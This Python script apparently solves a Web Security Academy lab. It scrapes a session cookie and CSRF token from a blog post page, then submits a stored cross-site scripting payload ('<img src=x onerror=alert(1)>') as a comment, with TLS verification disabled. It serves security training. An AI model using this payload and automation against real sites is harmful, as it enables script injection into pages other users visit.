import random
import re
import string
import time
import urllib.parse
import http.client
import ssl

LAB_ID = "0a8f0041042fe42e81dd7597007a00a2"


def POST_post_comment(
        session: str,
        csrf: str,
        post_id: int,
        comment: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/post/comment'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    fields = [
        ('csrf', csrf),
        ('postId', str(post_id)),
        ('comment', comment),
        ('name', 'greg'),
        ('email', 'greg@test.com'),
        ('website', 'https://fasdf.com'),
    ]
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_post(
        post_id: int,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/post'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    query_params = [
        ('postId', str(post_id)),
    ]
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, f"{path}?{urllib.parse.urlencode(query_params)}", body, headers)
    return connection.getresponse()


def post_csrf(
        post_id: int,
) -> tuple[str, str]:
    response = GET_post(post_id)
    cookie_header = response.getheader('set-cookie')
    session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
    csrf = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', response.read().decode('utf-8'))[0]
    return session, csrf

def random_str() -> str:
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))

post_id = 2
session, csrf = post_csrf(post_id)
border = random_str()
response = POST_post_comment(
    session=session,
    csrf=csrf,
    post_id=post_id,
    comment="<><img src=x onerror=alert(1)>",
)
print(f"status: {response.status}")
for header, value in response.headers.items():
    print(f"{header}: {value}")
print()
print(response.read().decode())
